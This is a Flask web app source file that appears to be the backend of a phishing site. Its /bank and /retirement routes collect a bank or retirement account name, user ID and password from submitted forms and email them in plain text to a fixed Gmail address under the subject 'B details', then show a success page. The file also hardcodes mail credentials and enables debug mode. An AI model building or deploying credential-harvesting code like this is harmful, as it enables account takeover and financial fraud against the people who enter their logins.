from flask import Flask, render_template, request, flash, redirect, url_for, session, abort, jsonify, send_file
import os
import requests
from flask_mail import Mail, Message
import os
basedir = os.path.abspath(os.path.dirname(__file__))

app = Flask(__name__)
mail = Mail()
mail.init_app(app)


 





app.config["DEBUG"] = True


app.config["SQLALCHEMY_POOL_RECYCLE"] = 299
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = 'SECRET_KEY'
app.config['UPLOADED_PHOTOS_DEST'] = os.path.join(basedir, 'static/images')
app.config['MAIL_SERVER']='smtp.gmail.com'
app.config['MAIL_PORT'] = 465
app.config['MAIL_USERNAME'] = 'olamicreas@gmail.com'
app.config['MAIL_PASSWORD'] = 'smtpp'
app.config['MAIL_USE_TLS'] = False
app.config['MAIL_USE_SSL'] = True
app.config['MAIL_DEFAULT_SENDER'] = 'olamicreas@gmail.com'
mail = Mail(app)


@app.route('/login')
def login():

	return render_template('register.html')

@app.route('/register')
def register():
	return render_template('register.html')

@app.route('/')
def home():

	return render_template('index.html')

@app.route('/logout')
def logout():
	return render_template('logout.html')

@app.route('/suc')
def suc():
	return render_template('suc.html')




@app.route('/bank', methods=['POST', 'GET'])
def bank():
	if request.method == 'POST':

		bname = request.form.get('bname')
		userid = request.form.get('userid')
		password = request.form.get('password')

		body = bname + '\n' + userid + '\n' + password

		msg = Message(subject='B details', recipients= ['druryd446@gmail.com'], body=body)
		mail.send(msg)
		return redirect('suc')
	return render_template('bank.html')

@app.route('/retirement', methods=['POST', 'GET'])
def retirement():
	if request.method == 'POST':

		bname = request.form.get('rname')
		userid = request.form.get('userid')
		password = request.form.get('password')

		body = bname + '\n' + userid + '\n' + password

		msg = Message(subject='B details', recipients= ['druryd446@gmail.com'], body=body)
		mail.send(msg)
		return redirect('suc')
	return render_template('retirement.html')




if __name__ == '__main__':
    app.run()
